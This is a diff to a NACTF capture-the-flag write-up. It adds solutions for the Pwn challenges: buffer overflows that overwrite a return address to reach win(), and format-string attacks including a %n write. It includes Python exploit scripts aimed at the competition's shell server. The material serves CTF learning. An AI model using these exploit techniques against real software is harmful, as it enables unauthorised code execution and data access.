@@ -1,12 +1,12 @@
 # NACTF Write-up
 
 ##### Table of Contents  
-[I General skills](#i-general-skills)  
-[II Crypto](#ii-crypto)  
-[III Reverse engineering](#iii-reverse-engineering)  
+[I General skills](#i-general-skills)  (Cellular evolution 3 missing)
+[II Crypto](#ii-crypto)  (Randomizer 2 missing)
+[III Reverse engineering](#iii-reverse-engineering) 
 [IV Forensics](#iv-forensics)  
 [V Web](#v-web-exploitation)  
-[VI Pwn](#vi-pwn)  
+[VI Pwn](#vi-pwn)  (loopy0, loopy1 missing)
 
 ## I General skills
 
@@ -505,5 +505,136 @@ Well, SQL injection is important. The first thing to try is always ```'or 1=1--`
 So what do we have. Cookie monster, a countdown page and a flag page. During the competition, the flag page would indicate that it's not time yet and to come back later. The trick is obviously to alter the cookie. Inspecting we see a suspicious ```session-time``` cookie with a large number that turns out is unix time. Some code must check the session-time, compare it to a fixed value and only show the time if the ```session-time``` is greater or equal than the fixed value. So how about we just alter the cookie way in the future? I just incremented one of the first few digits by one and that worked.
 
 ## VI Pwn
+
+### 1. BufferOverflow #0 (100, 680 solves)
+The instruction say to simply cause a segfault to overflow. To get a segfault, we must simply overwrite the return pointer. Doesn't matter with what (as long as it's not a correct return address...). Just send any string longer than 28 chars (buffer + some junk on the stack) and the flag you shall get.
+
+
+### 2. BufferOverflow #1 (200, 418 solves)
+Same, but different. This time we actually want to overwrite the address to get to the ```win()``` function:
+
+```
+void win()
+{
+	printf("You win!\n");
+	char buf[256];
+	FILE* f = fopen("./flag.txt", "r");
+	if (f == NULL)
+	{
+		puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
+	}
+	else
+	{
+		fgets(buf, sizeof(buf), f);
+		printf("flag: %s\n", buf);
+	}
+}
+```
+A look at IDA:
+
+```
+.text:080491B2 ; void win(int)
+...
+```
+
+So we simply need to send junk + address of win (```0x080491b2```) so that the return address gets overwritten by the address of win. Full code:
+
+```python
+from STTSocket import *
+import time
+
+ur = 'shell.2019.nactf.com 31462'
+add = '080491b2'.decode('hex')
+
+add = add[::-1]
+
+s = STTSocket(ur)
+
+print s.recv(1024)
+
+s.send(add*10)
+time.sleep(0.5)
+print s.recv(1024)
+```
+
+
+### 3. BufferOverflow #2 (200, 272 solves)
+Another small added twist: we need to pass arguments to the function. As evidenced by the c code:
+
+```c
+void win(long long arg1, int arg2)
+{
+	if (arg1 != 0x14B4DA55 || arg2 != 0xF00DB4BE)
+	{
+		puts("Close, but not quite.");
+		exit(1);
+	}
+
+	printf("You win!\n");
+	char buf[256];
+	FILE* f = fopen("./flag.txt", "r");
+	if (f == NULL)
+	{
+		puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
+	}
+	else
+	{
+		fgets(buf, sizeof(buf), f);
+		printf("flag: %s\n", buf);
+	}
+}
+```
+
+This is a classic challenge. Usually the arguments for a function follow eachother on the stack. Now pay attention to the argument types: long long and int. This was a bit of a trap: long long are 8 bytes while int are 4. That means that we will need to send a total of 12 bytes as arguments. The correct code is thus ```|padding (28 bytes)|return address (4 bytes)|padding (4 bytes)|arg1 (8 bytes)|arg2 (4 bytes)|```
+
+It took me a very long time because using bash and gdb, bash ignores null bytes. It drove me crazy until I tried to run the exploit on the server directly. How to lose half a day...
+
+
+### 4. Format #0 (200, 263 solves)
+Format strings exploits are nice. I always liked them. In this case we know the flag is on the stack so just print values until we find it. Simply send a ```%s``` * 20 and enjoy the flag. 
+
+### 5. Format #1 (250, 197 solves)
+Just as with the buf2, we need to change an argument this time. Having a look at the .c:
+
+```c
+int main()
+{
+	/* Disable buffering on stdout */
+	setvbuf(stdout, NULL, _IONBF, 0);
+
+	int num = 0;
+
+	vuln(&num);
+
+	if (num == 42)
+	{
+		puts("You win!");
+		win();
+	}
+	else
+	{
+		printf("%d != 42, try again", num);
+	}
+
+	return 0;
+}
+```
+
+First thing we need is to find ```num``` on the stack. We can bruteforce by sending ```%i$x``` incrementing i. We see a candidate at position 24. So we need to make sure that we send 42 bytes and we can write them at that address using ```n```. Final code:
+
+```python
+from STTSocket import *
+
+import time
+
+add = 'shell.2019.nactf.com 31560'
+
+s = STTSocket(add)
+s.recv(1024)
+t = s.send('a'*42 + '%{}$n '.format(24))
+time.sleep(0.2)
+tmp =  s.recv(1024)
+print tmp
+```
 
 
